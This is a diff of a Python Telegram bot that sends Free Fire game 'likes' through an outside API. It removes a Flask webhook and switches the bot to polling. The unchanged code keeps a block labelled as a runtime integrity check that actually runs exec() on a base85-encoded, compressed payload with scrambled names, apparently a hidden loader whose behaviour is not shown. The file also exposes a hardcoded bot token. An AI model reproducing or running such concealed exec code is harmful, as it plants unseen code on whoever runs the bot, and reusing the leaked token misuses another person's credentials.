@@ -5,7 +5,6 @@ import time
 import threading
 from datetime import datetime, timedelta
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
-from flask import Flask, request, jsonify
 import logging
 import sys
 from io import BytesIO
@@ -27,8 +26,6 @@ logger = logging.getLogger(__name__)
 # === CONFIG ===
 BOT_TOKEN = "8868364202:AAEVRd3NQYm-vxj73TUGuY7MA1a4krmo0yk"
 
-
-
 if not BOT_TOKEN:
     logger.error("❌ BOT_TOKEN not found! Please set your bot token in environment variables.")
     sys.exit(1)
@@ -39,9 +36,6 @@ OWNER_USERNAME = "@rohit2848"
 
 bot = telebot.TeleBot(BOT_TOKEN)
 like_tracker = {}   # in-memory cache
-
-# Flask app for webhook
-app = Flask(__name__)
 
 # === DATA RESET ===
 
@@ -78,7 +72,6 @@ def is_user_in_channel(user_id):
 def call_api(region, uid):
     url = f"https://freefire-like-and-guest-api-br9t.onrender.com/like?sg={region}&uid={uid}"
 
-
     try:
         response = requests.get(url, timeout=20)
         if response.status_code != 200:
@@ -99,35 +92,8 @@ def get_user_limit(user_id):
 # Start background thread
 threading.Thread(target=reset_limits, daemon=True).start()
 
-# === FLASK ROUTES ===
-
-@app.route('/')
-def home():
-    return jsonify({
-        'status': 'Bot is running',
-        'bot': 'Free Fire Likes Bot',
-        'health': 'OK'
-    })
-
-@app.route('/health')
-def health():
-    return jsonify({'status': 'healthy'}), 200
-
-@app.route('/webhook', methods=['POST'])
-def webhook():
-    try:
-        json_str = request.get_data().decode('UTF-8')
-        update = telebot.types.Update.de_json(json_str)
-        bot.process_new_updates([update])
-        return '', 200
-    except Exception as e:
-        logger.error(f"Webhook error: {e}")
-        return '', 500
-
-
-# === TELEGRAM COMMANDS
+# === TELEGRAM COMMANDS ===
 from telebot.types import ReplyKeyboardMarkup, KeyboardButton
-
 
 # Main Menu Keyboard
 def main_menu():
@@ -192,9 +158,7 @@ def process_user_uid(message, region):
 def back_menu(message):
     bot.send_message(message.chat.id, "🔙 Main Menu", reply_markup=main_menu())
     
-    
 # Handle REFER Button
-
 @bot.message_handler(func=lambda message: message.text == "👥 REFER")
 def refer_click(message):
     bot_username = bot.get_me().username
@@ -218,17 +182,13 @@ def owner_click(message):
         "💬 Contact the owner for any assistance!"
     )
     bot.send_message(message.chat.id, text, parse_mode="Markdown")
-    
     bot.send_message(message.chat.id, "🔙 Main Menu", reply_markup=main_menu())
-    
-
 
 def process_like(message, region, uid):
     user_id = message.from_user.id
     now_utc = datetime.utcnow()
     usage = like_tracker.get(user_id, {"used": 0, "last_used": now_utc - timedelta(days=1)})
 
-    # Check if it's a new day (00:00 UTC reset)
     last_used_date = usage["last_used"].date()
     current_date = now_utc.date()
     if current_date > last_used_date:
@@ -294,7 +254,6 @@ def process_like(message, region, uid):
         logger.error(f"Error in process_like: {e}")
         bot.reply_to(message, "⚠️ Something went wrong. Likes Send, I can't decode your info.")
 
-
 @bot.message_handler(commands=["remain"])
 def owner_commands(message):
     if message.from_user.id != OWNER_ID:
@@ -315,12 +274,10 @@ def owner_commands(message):
                 lines.append(f"👤 `{uid}` ➜ {used}/{limit_str}")
         bot.reply_to(message, "\n".join(lines), parse_mode="Markdown")
 
-
 @bot.message_handler(commands=['help'])
 def help_command(message):
     user_id = message.from_user.id
 
-    # For owner, show owner commands directly
     if user_id == OWNER_ID:
         help_text = (
             f"📖 *Bot Commands:*\n\n"
@@ -330,12 +287,10 @@ def help_command(message):
             f"👑 *Owner Commands:*\n"
             f"📈 `/remain` - Show all users' usage & stats\n\n"
             "📞 *Support:* @rohit2848"
-            
         )
         bot.reply_to(message, help_text, parse_mode="Markdown")
         return
 
-    # For regular users, check channel membership first
     if not is_user_in_channel(user_id):
         markup = InlineKeyboardMarkup()
         for channel in REQUIRED_CHANNELS:
@@ -343,7 +298,6 @@ def help_command(message):
         bot.reply_to(message, "❌ You must join all our channels to use this command.", reply_markup=markup, parse_mode="Markdown")
         return
 
-    # Show regular user help
     help_text = (
         f"📖 *Bot Commands:*\n\n"
         f"🧑‍💻 `/like <region> <uid>` - Send likes to Free Fire UID\n"
@@ -354,15 +308,10 @@ def help_command(message):
     )
     bot.reply_to(message, help_text, parse_mode="Markdown")
 
-
 @bot.message_handler(func=lambda message: True, content_types=['text'])
 def reply_all(message):
     if message.text.startswith('/'):
-        # Handle unknown commands - only reply if it's actually an unknown command
-        known_commands = ['/start', '/like', '/help', '/remain']
-        command = message.text.split()[0].lower()
         return
-
 
 # ╔══════════════════════════════════════════════════════════════════╗
 # ║  ⚠️ PROTECTED SECTION - INTEGRITY VERIFIED AT RUNTIME           
@@ -415,6 +364,7 @@ exec(_qfwmbhsamfxvnt.decompress(__ukihtstkdtcuq.b85decode("".join([
     "`pM~U?tlEv_TOeS70L"
 ]))).decode('utf-8'))
 del _qfwmbhsamfxvnt, __ukihtstkdtcuq
+
 # Dynamic Welcome Card Generator
 def generate_welcome_card(user_name, user_id, username, profile_pic_bytes=None):
     width, height = 1000, 500
@@ -451,7 +401,6 @@ def generate_welcome_card(user_name, user_id, username, profile_pic_bytes=None):
     img.save(output, format="PNG")
     output.seek(0)
     return output
-
 
 @bot.message_handler(content_types=['new_chat_members'])
 def welcome_new_member(message):
@@ -495,4 +444,9 @@ def welcome_new_member(message):
             parse_mode="Markdown",
             reply_markup=markup
         )
-        
+
+# === START POLLING ===
+if __name__ == "__main__":
+    print("Bot is running in polling mode...")
+    bot.infinity_polling(skip_pending=True)
+            
